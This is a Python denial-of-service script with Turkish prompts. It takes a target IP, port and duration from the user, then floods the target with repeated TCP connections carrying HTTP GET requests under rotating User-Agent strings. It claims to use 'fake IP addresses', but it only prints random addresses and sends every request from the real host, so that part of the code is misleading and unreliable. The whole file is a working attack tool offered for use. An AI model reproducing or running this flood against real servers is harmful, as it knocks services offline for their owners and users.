import socket
import random
import threading
import signal
import sys
import struct
import traceback
import time


attack_event = threading.Event()

def get_fake_ip_addresses(num_addresses):
    fake_ip_addresses = []
    for _ in range(num_addresses):
        fake_ip_addresses.append(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))
    return fake_ip_addresses

def get_target_ports():
   
    target_ports = [80, 443, 53]
   
    # En çok kullanılan 10 port numarası (yorum satırı olarak)
    """
    target_ports = [80, 443, 22, 21, 25, 3389, 110, 445, 139, 143]
    """

    # En çok kullanılan 20 port numarası (yorum satırı olarak)
    """target_ports = [80, 443, 22, 21, 25, 3389, 110, 445, 139, 143, 53,
                      3306, 8080, 1723, 111, 995, 993, 5900, 1025, 1433]"""

    # En çok kullanılan 50 port numarası (yorum satırı olarak)
    """
    target_ports = [
        80, 443, 22, 21, 25, 3389, 110, 445, 139, 143,  # ilk 10
        53, 3306, 8080, 1723, 111, 995, 993, 5900, 1025, 1433,  # 11-20
        199, 1720, 465, 6001, 587, 49152, 2000, 515, 68, 137,  # 21-30
        161, 4567, 5000, 69, 5672, 7001, 9200, 49154, 8000, 79,  # 31-40
        5800, 6112, 33848, 113, 135, 7, 1026, 1645, 1812, 1701  # 41-50
    ]
    """
    return target_ports

def get_attack_duration():
    while True:
        try:
            duration = int(input("Saldırı Süresini Girin (saniye): "))
            if duration > 0:
                return duration
            else:
                print("Geçersiz giriş. Saldırı süresi pozitif bir tam sayı olmalıdır.")
        except ValueError:
            print("Geçersiz giriş. Lütfen sayısal bir değer girin.")

def attack(fake_ips, target, port, user_agents, duration):
    start_time = time.time()
    while not attack_event.is_set() and time.time() - start_time < duration:
        try:
            for fake_ip in fake_ips:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, int(port)))
                s.settimeout(2)

                request = ("GET / HTTP/1.1\r\n"
                           "Host: " + target + "\r\n"
                           "User-Agent: " + random.choice(user_agents) + "\r\n"
                           "Accept: " + str(random.randint(1, 1000000)) + "\r\n"
                           "Connection: keep-alive\r\n\r\n").encode('utf-8')

                print(f"HTTP GET İsteği Gönderiliyor ({fake_ip}):\n", request.decode('utf-8'))

                s.sendall(request)
                wait_time = random.uniform(0.1, 1)
                time.sleep(wait_time)

        except Exception as e:
            print("Hata oluştu: {}\n" .format(e))
            traceback.print_exc()

    attack_event.set()

def main():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/536.36',
        'Chrome/58.0.3029.110',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q317910)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q317910)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; AOL 7.0; Windows NT 5.1; .NET CLR 1.0.2914)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)',
        'Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:0.9.4) Gecko/20011019 Netscape6/6.2',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1',
        'Mozilla/4.0 (compatible; MSIE 12; Windows NT 10.0; Win64; Trident/8.0; ms-office; MSOffice 16)',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; X11; .NET CLR 1.0.3705)'
    ]

    print("======================== DDoS Saldırısı Başlatılıyor ==============================")

    num_fake_ips = int(input("Kaç sahte IP adresi kullanmak istiyorsunuz? "))
    fake_ips = get_fake_ip_addresses(num_fake_ips)
    target = input("Hedef IP Adresini Girin: ")

    change_data = input("Hedef Port ve Sahte IP Değerlerini Değiştirmek İster Misiniz? (E/H): ")

    if change_data.lower() == "e":
        try:
            port = int(input("Hedef Port Girin (Varsayılan: 80): ") or random.choice(get_target_ports()))
            if not (0 <= port <= 65535):
              print("Geçersiz giriş. Port numarası 0 ile 65535 arasında olmalıdır.")
              sys.exit(1)
        except ValueError:
            print("Geçersiz giriş. Sayısal bir değer giriniz.")
            sys.exit(1)
        fake_ip = input("Sahte IP Adresini Girin (Varsayılan: {}): ".format(fake_ips[0])) or fake_ips[0]
        duration = get_attack_duration()  
    else:
        fake_ip = fake_ips[0]
        duration = get_attack_duration() 
        port = random.choice(get_target_ports())

  
    t = threading.Thread(target=attack, args=(fake_ips, target, port, user_agents, duration), name="AttackThread")
    t.start()

    print("Saldırı başlatıldı. Saldırıyı durdurmak için Ctrl+C kullanın.")

    try:
        start_time = time.time()
        while not attack_event.is_set() and time.time() - start_time < duration:
            time.sleep(1)  
        print("Saldırı süresi doldu...")

    except KeyboardInterrupt:
        attack_event.set()  
        t.join()
        print("Saldırı durduruluyor...")
        traceback.print_exc()

def signal_handler(sig, frame):
    print("\nCtrl+C ile çıkılıyor...")
    attack_event.set()
    sys.exit(0)
    
    traceback.print_exc()

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    main()
    sys.exit(0)
